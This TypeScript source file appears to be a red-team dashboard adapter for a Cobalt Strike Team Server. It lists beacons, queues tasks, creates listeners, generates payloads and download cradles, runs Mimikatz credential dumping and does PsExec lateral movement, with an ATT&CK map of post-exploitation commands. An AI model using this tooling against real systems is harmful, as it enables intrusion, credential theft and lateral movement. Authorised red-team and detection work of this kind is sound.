/**
 * Cobalt Strike C2 Adapter
 *
 * Implements the IC2Adapter interface for Cobalt Strike Team Server integration.
 * Communicates via the Cobalt Strike REST API (Sleep/Aggressor Script bridge)
 * or the Team Server's external C2 interface.
 *
 * Features:
 * - Beacon listing with metadata (sleep, jitter, last seen, arch, PID)
 * - Task dispatch (shell, execute-assembly, BOF, powershell, etc.)
 * - Result collection from beacon task output
 * - Listener management (HTTP, HTTPS, DNS, SMB, TCP)
 * - Payload generation (staged/stageless, EXE/DLL/shellcode)
 * - Malleable C2 profile awareness
 * - MITRE ATT&CK mapping for all built-in commands
 * - Sleep/jitter control per beacon
 * - Beacon metadata extraction (user, hostname, OS, process)
 *
 * Required ENV:
 *   CS_TEAM_SERVER_URL — Team Server REST API URL (e.g., https://teamserver:55553)
 *   CS_API_KEY — API authentication token
 *   CS_USERNAME — Operator username (optional, for audit trail)
 *   CS_PASSWORD — Operator password (optional)
 *
 * Author: Harrison Cook — AceofCloud
 */

import { ENV } from "../_core/env";
import type {
  IC2Adapter,
  C2Agent,
  C2AgentStatus,
  C2Module,
  C2ModuleOption,
  C2TaskRequest,
  C2TaskResult,
  C2HealthStatus,
  C2FrameworkType,
} from "./c2-abstraction";

// ─── Cobalt Strike Types ──────────────────────────────────────────────────

export interface CSBeacon {
  id: string;
  bid: number;                    // Beacon ID (numeric)
  user: string;
  computer: string;
  host: string;                   // Internal IP
  os: string;                     // OS version string
  ver: string;                    // OS version number
  arch: string;                   // x64, x86
  pid: number;
  process: string;                // Process name
  is64: boolean;
  barch: string;                  // Beacon architecture
  last: number;                   // Last checkin (epoch ms)
  alive: boolean;
  sleep: number;                  // Sleep time in ms
  jitter: number;                 // Jitter percentage (0-100)
  external: string;               // External IP
  internal: string;               // Internal IP
  port: number;                   // Callback port
  note: string;                   // Operator notes
  listener: string;               // Associated listener name
  pbid: string;                   // Parent beacon ID (for pivots)
  charset: string;
}

export interface CSListener {
  name: string;
  payload: string;                // beacon_http, beacon_https, beacon_dns, beacon_smb, beacon_tcp
  host: string;
  port: number;
  bindto: number;
  profile: string;                // Malleable C2 profile name
  status: string;
}

export interface CSTask {
  bid: number;
  taskId: string;
  command: string;
  args: string;
  status: "queued" | "running" | "complete" | "error";
  output?: string;
  error?: string;
  operator: string;
  timestamp: number;
}

export interface CSPayloadConfig {
  listener: string;
  type: "exe" | "dll" | "raw" | "powershell" | "vba" | "hta" | "svc_exe";
  arch: "x64" | "x86";
  staged: boolean;
  exitFunc: "process" | "thread" | "seh";
  syscalls?: "none" | "direct" | "indirect";
}

// ─── MITRE ATT&CK Mapping ────────────────────────────────────────────────

/**
 * Maps Cobalt Strike built-in commands and BOFs to MITRE ATT&CK technique IDs.
 * This is a comprehensive mapping covering the most commonly used CS capabilities.
 */
export const CS_TECHNIQUE_MAP: Record<string, { techniqueId: string; tactic: string; name: string }> = {
  // Execution
  "shell": { techniqueId: "T1059.003", tactic: "execution", name: "Windows Command Shell" },
  "run": { techniqueId: "T1059.003", tactic: "execution", name: "Execute Command" },
  "execute": { techniqueId: "T1106", tactic: "execution", name: "Native API Execution" },
  "powershell": { techniqueId: "T1059.001", tactic: "execution", name: "PowerShell" },
  "powershell-import": { techniqueId: "T1059.001", tactic: "execution", name: "PowerShell Import" },
  "powerpick": { techniqueId: "T1059.001", tactic: "execution", name: "Unmanaged PowerShell" },
  "psinject": { techniqueId: "T1055.012", tactic: "execution", name: "PowerShell Process Injection" },
  "execute-assembly": { techniqueId: "T1059", tactic: "execution", name: "Execute .NET Assembly" },
  "inline-execute": { techniqueId: "T1106", tactic: "execution", name: "Inline Execute BOF" },

  // Process Injection
  "inject": { techniqueId: "T1055", tactic: "defense-evasion", name: "Process Injection" },
  "shinject": { techniqueId: "T1055.005", tactic: "defense-evasion", name: "Shellcode Injection" },
  "dllinject": { techniqueId: "T1055.001", tactic: "defense-evasion", name: "DLL Injection" },
  "dllload": { techniqueId: "T1574.002", tactic: "persistence", name: "DLL Side-Loading" },

  // Credential Access
  "hashdump": { techniqueId: "T1003.002", tactic: "credential-access", name: "SAM Hash Dump" },
  "logonpasswords": { techniqueId: "T1003.001", tactic: "credential-access", name: "LSASS Memory" },
  "mimikatz": { techniqueId: "T1003.001", tactic: "credential-access", name: "Mimikatz" },
  "dcsync": { techniqueId: "T1003.006", tactic: "credential-access", name: "DCSync" },
  "chromedump": { techniqueId: "T1555.003", tactic: "credential-access", name: "Chrome Credential Dump" },
  "keylogger": { techniqueId: "T1056.001", tactic: "collection", name: "Keylogger" },

  // Lateral Movement
  "psexec": { techniqueId: "T1021.002", tactic: "lateral-movement", name: "PsExec" },
  "psexec_psh": { techniqueId: "T1021.002", tactic: "lateral-movement", name: "PsExec PowerShell" },
  "wmi": { techniqueId: "T1047", tactic: "lateral-movement", name: "WMI" },
  "winrm": { techniqueId: "T1021.006", tactic: "lateral-movement", name: "WinRM" },
  "dcom": { techniqueId: "T1021.003", tactic: "lateral-movement", name: "DCOM" },
  "ssh": { techniqueId: "T1021.004", tactic: "lateral-movement", name: "SSH" },
  "jump": { techniqueId: "T1021", tactic: "lateral-movement", name: "Lateral Movement Jump" },
  "remote-exec": { techniqueId: "T1021", tactic: "lateral-movement", name: "Remote Execution" },
  "link": { techniqueId: "T1021.002", tactic: "lateral-movement", name: "Link to SMB Beacon" },
  "connect": { techniqueId: "T1021", tactic: "lateral-movement", name: "Connect to TCP Beacon" },

  // Privilege Escalation
  "getsystem": { techniqueId: "T1134.001", tactic: "privilege-escalation", name: "Get SYSTEM" },
  "elevate": { techniqueId: "T1548", tactic: "privilege-escalation", name: "Elevate Privileges" },
  "runasadmin": { techniqueId: "T1548.002", tactic: "privilege-escalation", name: "UAC Bypass" },
  "getprivs": { techniqueId: "T1134.002", tactic: "privilege-escalation", name: "Adjust Token Privileges" },
  "make_token": { techniqueId: "T1134.003", tactic: "privilege-escalation", name: "Make Token" },
  "steal_token": { techniqueId: "T1134.001", tactic: "privilege-escalation", name: "Steal Token" },
  "rev2self": { techniqueId: "T1134", tactic: "privilege-escalation", name: "Revert to Self" },
  "runas": { techniqueId: "T1134.002", tactic: "privilege-escalation", name: "Run As" },

  // Discovery
  "ps": { techniqueId: "T1057", tactic: "discovery", name: "Process List" },
  "net": { techniqueId: "T1018", tactic: "discovery", name: "Network Discovery" },
  "portscan": { techniqueId: "T1046", tactic: "discovery", name: "Port Scan" },
  "ipconfig": { techniqueId: "T1016", tactic: "discovery", name: "Network Configuration" },
  "netstat": { techniqueId: "T1049", tactic: "discovery", name: "Network Connections" },
  "whoami": { techniqueId: "T1033", tactic: "discovery", name: "System Owner/User" },
  "drives": { techniqueId: "T1083", tactic: "discovery", name: "Enumerate Drives" },
  "ls": { techniqueId: "T1083", tactic: "discovery", name: "File/Directory Discovery" },
  "reg": { techniqueId: "T1012", tactic: "discovery", name: "Registry Query" },

  // Persistence
  "argue": { techniqueId: "T1036.004", tactic: "defense-evasion", name: "Argument Spoofing" },
  "service": { techniqueId: "T1543.003", tactic: "persistence", name: "Windows Service" },
  "schtasks": { techniqueId: "T1053.005", tactic: "persistence", name: "Scheduled Task" },

  // Defense Evasion
  "ppid": { techniqueId: "T1134.004", tactic: "defense-evasion", name: "Parent PID Spoofing" },
  "blockdlls": { techniqueId: "T1562.001", tactic: "defense-evasion", name: "Block DLLs" },
  "spawnto": { techniqueId: "T1055", tactic: "defense-evasion", name: "Set Spawn To" },
  "timestomp": { techniqueId: "T1070.006", tactic: "defense-evasion", name: "Timestomp" },

  // Collection
  "screenshot": { techniqueId: "T1113", tactic: "collection", name: "Screen Capture" },
  "clipboard": { techniqueId: "T1115", tactic: "collection", name: "Clipboard Data" },
  "desktop": { techniqueId: "T1113", tactic: "collection", name: "Desktop VNC" },

  // Exfiltration / File Transfer
  "upload": { techniqueId: "T1105", tactic: "command-and-control", name: "Upload File" },
  "download": { techniqueId: "T1041", tactic: "exfiltration", name: "Download File" },

  // C2 / Pivoting
  "socks": { techniqueId: "T1090.001", tactic: "command-and-control", name: "SOCKS Proxy" },
  "rportfwd": { techniqueId: "T1090", tactic: "command-and-control", name: "Reverse Port Forward" },
  "covertvpn": { techniqueId: "T1572", tactic: "command-and-control", name: "Covert VPN" },
  "sleep": { techniqueId: "T1029", tactic: "command-and-control", name: "Sleep/Jitter Control" },
  "exit": { techniqueId: "T1070.004", tactic: "defense-evasion", name: "Exit Beacon" },

  // Kerberos
  "kerberos_ticket_use": { techniqueId: "T1550.003", tactic: "lateral-movement", name: "Pass the Ticket" },
  "kerberos_ticket_purge": { techniqueId: "T1550.003", tactic: "credential-access", name: "Purge Kerberos Tickets" },
  "golden_ticket": { techniqueId: "T1558.001", tactic: "credential-access", name: "Golden Ticket" },
};

// ─── Cobalt Strike Adapter ───────────────────────────────────────────────

export class CobaltStrikeAdapter implements IC2Adapter {
  readonly framework: C2FrameworkType = "cobaltstrike" as C2FrameworkType;

  private get baseUrl(): string {
    return ENV.CS_TEAM_SERVER_URL || "";
  }

  private get apiKey(): string {
    return ENV.CS_API_KEY || "";
  }

  private get apiPort(): number {
    return ENV.CS_API_PORT || 55553;
  }

  /**
   * Make an authenticated request to the Cobalt Strike Team Server REST API.
   * The CS REST API (via the Aggressor Script bridge or third-party REST wrappers
   * like cs-rest-api) typically uses Bearer token or custom header auth.
   */
  private async csFetch(endpoint: string, options: RequestInit = {}): Promise<any> {
    if (!this.baseUrl) throw new Error("CS_TEAM_SERVER_URL not configured");
    const url = `${this.baseUrl}:${this.apiPort}${endpoint}`;
    const resp = await fetch(url, {
      ...options,
      headers: {
        "Authorization": `Bearer ${this.apiKey}`,
        "Content-Type": "application/json",
        "X-CS-Operator": ENV.CS_USERNAME || "caldera-dashboard",
        ...(options.headers || {}),
      },
    });
    if (!resp.ok) {
      const text = await resp.text().catch(() => "");
      throw new Error(`CS API ${resp.status}: ${text}`);
    }
    return resp.json().catch(() => null);
  }

  // ─── IC2Adapter Implementation ────────────────────────────────────────

  async healthCheck(): Promise<C2HealthStatus> {
    try {
      const [info, beacons, listeners] = await Promise.all([
        this.csFetch("/api/server/info").catch(() => null),
        this.csFetch("/api/beacons").catch(() => []),
        this.csFetch("/api/listeners").catch(() => []),
      ]);

      const beaconCount = Array.isArray(beacons) ? beacons.length : 0;
      const listenerCount = Array.isArray(listeners) ? listeners.length : 0;

      return {
        framework: "cobaltstrike" as C2FrameworkType,
        connected: true,
        version: info?.version || info?.cs_version || "4.x",
        agentCount: beaconCount,
        activeJobs: 0,
        lastChecked: new Date().toISOString(),
        details: {
          beacons: beaconCount,
          listeners: listenerCount,
          license: info?.license || "unknown",
          profile: info?.profile || "default",
        },
      };
    } catch (err: any) {
      return {
        framework: "cobaltstrike" as C2FrameworkType,
        connected: false,
        agentCount: 0,
        activeJobs: 0,
        lastChecked: new Date().toISOString(),
        error: err.message,
      };
    }
  }

  async listAgents(): Promise<C2Agent[]> {
    try {
      const beacons = await this.csFetch("/api/beacons");
      if (!Array.isArray(beacons)) return [];

      return beacons.map((b: any) => this.mapBeaconToAgent(b));
    } catch {
      return [];
    }
  }

  async getAgent(agentId: string): Promise<C2Agent | null> {
    try {
      // Try direct beacon lookup first
      const beacon = await this.csFetch(`/api/beacons/${agentId}`);
      if (beacon) return this.mapBeaconToAgent(beacon);
    } catch {
      // Fall back to list search
    }
    const agents = await this.listAgents();
    return agents.find(a => a.id === agentId) || null;
  }

  async searchModules(query: string): Promise<C2Module[]> {
    // Cobalt Strike uses built-in commands rather than loadable modules.
    // Map all built-in commands to C2Module format with MITRE ATT&CK mappings.
    const csCommands = this.getBuiltinCommands();
    const q = query.toLowerCase();
    return csCommands.filter(c =>
      c.name.toLowerCase().includes(q) ||
      c.description.toLowerCase().includes(q) ||
      c.id.includes(q) ||
      c.techniqueId?.toLowerCase().includes(q) ||
      c.tactic?.toLowerCase().includes(q)
    );
  }

  async getModule(moduleId: string): Promise<C2Module | null> {
    const modules = this.getBuiltinCommands();
    return modules.find(m => m.id === moduleId) || null;
  }

  async dispatch(request: C2TaskRequest): Promise<C2TaskResult> {
    const startedAt = new Date().toISOString();
    try {
      // Dispatch task to beacon via Team Server API
      const result = await this.csFetch(`/api/beacons/${request.agentId}/task`, {
        method: "POST",
        body: JSON.stringify({
          command: request.moduleId,
          args: request.options?.args || "",
          data: request.options?.data,
          operator: ENV.CS_USERNAME || "caldera-dashboard",
        }),
      });

      const taskId = result?.taskId || result?.task_id || `cs-${request.agentId}-${Date.now()}`;
      return {
        taskId,
        framework: "cobaltstrike" as C2FrameworkType,
        agentId: request.agentId,
        moduleId: request.moduleId,
        status: "pending",  // Beacons are asynchronous — task queued until next checkin
        exitCode: -1,
        stdout: "",
        stderr: "",
        startedAt,
        metadata: {
          beaconId: request.agentId,
          command: request.moduleId,
          queuedAt: startedAt,
        },
      };
    } catch (err: any) {
      return {
        taskId: `cs-err-${Date.now()}`,
        framework: "cobaltstrike" as C2FrameworkType,
        agentId: request.agentId,
        moduleId: request.moduleId,
        status: "error",
        exitCode: -1,
        stdout: "",
        stderr: err.message,
        startedAt,
        completedAt: new Date().toISOString(),
      };
    }
  }

  async pollResult(taskId: string, agentId: string): Promise<C2TaskResult> {
    try {
      const result = await this.csFetch(`/api/beacons/${agentId}/tasks/${taskId}`);
      const isComplete = result?.status === "complete" || result?.completed;

      return {
        taskId,
        framework: "cobaltstrike" as C2FrameworkType,
        agentId,
        moduleId: result?.command || "",
        status: isComplete ? "success" : (result?.status === "error" ? "failed" : "pending"),
        exitCode: isComplete ? 0 : -1,
        stdout: result?.output || result?.result || "",
        stderr: result?.error || "",
        startedAt: result?.timestamp ? new Date(result.timestamp).toISOString() : new Date().toISOString(),
        completedAt: isComplete ? new Date().toISOString() : undefined,
        metadata: {
          operator: result?.operator,
          beaconId: agentId,
        },
      };
    } catch (err: any) {
      return {
        taskId,
        framework: "cobaltstrike" as C2FrameworkType,
        agentId,
        moduleId: "",
        status: "error",
        exitCode: -1,
        stdout: "",
        stderr: err.message,
        startedAt: new Date().toISOString(),
      };
    }
  }

  async killAgent(agentId: string): Promise<boolean> {
    try {
      await this.csFetch(`/api/beacons/${agentId}/task`, {
        method: "POST",
        body: JSON.stringify({ command: "exit", args: "" }),
      });
      return true;
    } catch {
      return false;
    }
  }

  // ─── Cobalt Strike-Specific Methods ───────────────────────────────────

  /** List all active listeners on the Team Server */
  async listListeners(): Promise<CSListener[]> {
    try {
      const listeners = await this.csFetch("/api/listeners");
      return Array.isArray(listeners) ? listeners : [];
    } catch {
      return [];
    }
  }

  /** Create a new listener */
  async createListener(params: {
    name: string;
    payload: "beacon_http" | "beacon_https" | "beacon_dns" | "beacon_smb" | "beacon_tcp";
    host: string;
    port: number;
    bindto?: number;
    profile?: string;
  }): Promise<any> {
    return this.csFetch("/api/listeners", {
      method: "POST",
      body: JSON.stringify(params),
    });
  }

  /** Stop a listener */
  async stopListener(name: string): Promise<boolean> {
    try {
      await this.csFetch(`/api/listeners/${encodeURIComponent(name)}`, {
        method: "DELETE",
      });
      return true;
    } catch {
      return false;
    }
  }

  /** Adjust beacon sleep time and jitter */
  async setSleep(beaconId: string, sleepMs: number, jitter: number): Promise<boolean> {
    try {
      await this.csFetch(`/api/beacons/${beaconId}/task`, {
        method: "POST",
        body: JSON.stringify({
          command: "sleep",
          args: `${Math.floor(sleepMs / 1000)} ${jitter}`,
        }),
      });
      return true;
    } catch {
      return false;
    }
  }

  /** Generate a payload for a given listener */
  async generatePayload(config: CSPayloadConfig): Promise<{ data: string; filename: string } | null> {
    try {
      const result = await this.csFetch("/api/payloads/generate", {
        method: "POST",
        body: JSON.stringify(config),
      });
      return result;
    } catch {
      return null;
    }
  }

  /** Get beacon output/console history */
  async getBeaconOutput(beaconId: string): Promise<string[]> {
    try {
      const result = await this.csFetch(`/api/beacons/${beaconId}/output`);
      return Array.isArray(result) ? result : [];
    } catch {
      return [];
    }
  }

  /** Add a note to a beacon */
  async setBeaconNote(beaconId: string, note: string): Promise<boolean> {
    try {
      await this.csFetch(`/api/beacons/${beaconId}/note`, {
        method: "PUT",
        body: JSON.stringify({ note }),
      });
      return true;
    } catch {
      return false;
    }
  }

  /** Get the current Malleable C2 profile */
  async getMalleableProfile(): Promise<any> {
    try {
      return await this.csFetch("/api/server/profile");
    } catch {
      return null;
    }
  }

  /** Get download cradles for a listener */
  async getDownloadCradles(listener: string): Promise<Record<string, string>> {
    try {
      const result = await this.csFetch(`/api/listeners/${encodeURIComponent(listener)}/cradles`);
      return result || {};
    } catch {
      return {};
    }
  }

  /** Execute a Beacon Object File (BOF) on a beacon */
  async executeBOF(beaconId: string, bofPath: string, args?: string): Promise<C2TaskResult> {
    return this.dispatch({
      agentId: beaconId,
      moduleId: "inline-execute",
      options: {
        args: `${bofPath} ${args || ""}`.trim(),
      },
    });
  }

  /** Run Mimikatz on a beacon */
  async runMimikatz(beaconId: string, command: string = "sekurlsa::logonpasswords"): Promise<C2TaskResult> {
    return this.dispatch({
      agentId: beaconId,
      moduleId: "mimikatz",
      options: { args: command },
    });
  }

  /** Perform lateral movement via PsExec */
  async lateralPsExec(beaconId: string, target: string, listener: string, service?: string): Promise<C2TaskResult> {
    return this.dispatch({
      agentId: beaconId,
      moduleId: "psexec",
      options: {
        args: `${target} ${listener}${service ? ` ${service}` : ""}`,
      },
    });
  }

  /** Spawn a new beacon in a different process */
  async spawnBeacon(beaconId: string, listener: string, arch?: "x64" | "x86"): Promise<C2TaskResult> {
    return this.dispatch({
      agentId: beaconId,
      moduleId: "spawn",
      options: {
        args: `${arch || "x64"} ${listener}`,
      },
    });
  }

  // ─── Private Helpers ──────────────────────────────────────────────────

  private mapBeaconToAgent(b: any): C2Agent {
    return {
      id: String(b.bid || b.id || b.beacon_id),
      framework: "cobaltstrike" as C2FrameworkType,
      hostname: b.computer || b.hostname || "unknown",
      username: b.user || b.username || "unknown",
      platform: this.extractPlatform(b),
      architecture: b.arch || b.barch || (b.is64 ? "x64" : "x86"),
      ipAddress: b.internal || b.host || b.external || "",
      status: this.beaconStatus(b),
      lastSeen: b.last ? new Date(b.last).toISOString() : new Date().toISOString(),
      privileges: this.extractPrivileges(b),
      processId: b.pid,
      processName: b.process || b.proc,
      transport: this.extractTransport(b),
      metadata: {
        beaconId: b.bid,
        externalIp: b.external,
        listener: b.listener,
        parentBeacon: b.pbid,
        sleep: b.sleep,
        jitter: b.jitter,
        note: b.note,
        is64: b.is64,
        charset: b.charset,
        os: b.os || b.ver,
      },
    };
  }

  private beaconStatus(b: any): C2AgentStatus {
    if (b.alive === false) return "dead";
    if (!b.last) return "unknown";
    const lastCheckin = typeof b.last === "number" ? b.last : new Date(b.last).getTime();
    const sleepMs = b.sleep || 60000;
    const missedCheckins = (Date.now() - lastCheckin) / sleepMs;
    if (missedCheckins < 3) return "active";
    if (missedCheckins < 10) return "dormant";
    return "dead";
  }

  private extractPlatform(b: any): string {
    const os = (b.os || b.ver || "").toLowerCase();
    if (os.includes("windows")) return "windows";
    if (os.includes("linux")) return "linux";
    if (os.includes("darwin") || os.includes("macos") || os.includes("mac os")) return "macos";
    return "windows"; // CS beacons are predominantly Windows
  }

  private extractPrivileges(b: any): string {
    const user = (b.user || "").toLowerCase();
    if (user.includes("system") || user.includes("root")) return "system";
    // CS marks admin users with a * prefix
    if ((b.user || "").startsWith("*")) return "admin";
    return "user";
  }

  private extractTransport(b: any): string {
    const listener = (b.listener || "").toLowerCase();
    if (listener.includes("dns")) return "dns";
    if (listener.includes("smb")) return "smb";
    if (listener.includes("tcp")) return "tcp";
    if (listener.includes("https")) return "https";
    if (listener.includes("http")) return "http";
    return "https";
  }

  /**
   * Returns all built-in Cobalt Strike commands as C2Module objects
   * with full MITRE ATT&CK technique mappings.
   */
  private getBuiltinCommands(): C2Module[] {
    const modules: C2Module[] = [];

    for (const [cmdId, mapping] of Object.entries(CS_TECHNIQUE_MAP)) {
      modules.push({
        id: cmdId,
        framework: "cobaltstrike" as C2FrameworkType,
        name: mapping.name,
        description: `Cobalt Strike: ${mapping.name}`,
        type: "command",
        platform: this.commandPlatforms(cmdId),
        techniqueId: mapping.techniqueId,
        tactic: mapping.tactic,
        rank: this.commandRank(cmdId),
      });
    }

    // Add BOF-specific modules
    modules.push(
      {
        id: "bof-sa-whoami",
        framework: "cobaltstrike" as C2FrameworkType,
        name: "BOF: Situational Awareness - Whoami",
        description: "BOF implementation of whoami with extended info",
        type: "bof",
        platform: ["windows"],
        techniqueId: "T1033",
        tactic: "discovery",
        rank: 500,
      },
      {
        id: "bof-sa-netview",
        framework: "cobaltstrike" as C2FrameworkType,
        name: "BOF: Network View",
        description: "BOF for enumerating network shares and sessions",
        type: "bof",
        platform: ["windows"],
        techniqueId: "T1135",
        tactic: "discovery",
        rank: 500,
      },
      {
        id: "bof-sa-ldapsearch",
        framework: "cobaltstrike" as C2FrameworkType,
        name: "BOF: LDAP Search",
        description: "BOF for LDAP queries against Active Directory",
        type: "bof",
        platform: ["windows"],
        techniqueId: "T1087.002",
        tactic: "discovery",
        rank: 500,
      },
      {
        id: "bof-nanodump",
        framework: "cobaltstrike" as C2FrameworkType,
        name: "BOF: Nanodump",
        description: "BOF for dumping LSASS using syscalls",
        type: "bof",
        platform: ["windows"],
        techniqueId: "T1003.001",
        tactic: "credential-access",
        rank: 600,
      },
      {
        id: "bof-inlinewhispers",
        framework: "cobaltstrike" as C2FrameworkType,
        name: "BOF: InlineWhispers",
        description: "Direct syscall BOF for evasion",
        type: "bof",
        platform: ["windows"],
        techniqueId: "T1106",
        tactic: "defense-evasion",
        rank: 600,
      },
    );

    return modules;
  }

  private commandPlatforms(cmdId: string): string[] {
    // Most CS commands are Windows-only; some work cross-platform with CS 4.5+ cross-platform beacons
    const crossPlatform = ["shell", "run", "upload", "download", "sleep", "exit", "ls", "ps", "screenshot"];
    if (crossPlatform.includes(cmdId)) return ["windows", "linux", "macos"];
    return ["windows"];
  }

  private commandRank(cmdId: string): number {
    // Higher rank = more reliable/commonly used
    const highReliability = ["shell", "run", "upload", "download", "ps", "ls", "whoami", "ipconfig", "sleep"];
    const medReliability = ["powershell", "execute-assembly", "hashdump", "screenshot", "psexec", "net"];
    if (highReliability.includes(cmdId)) return 500;
    if (medReliability.includes(cmdId)) return 400;
    return 300;
  }
}
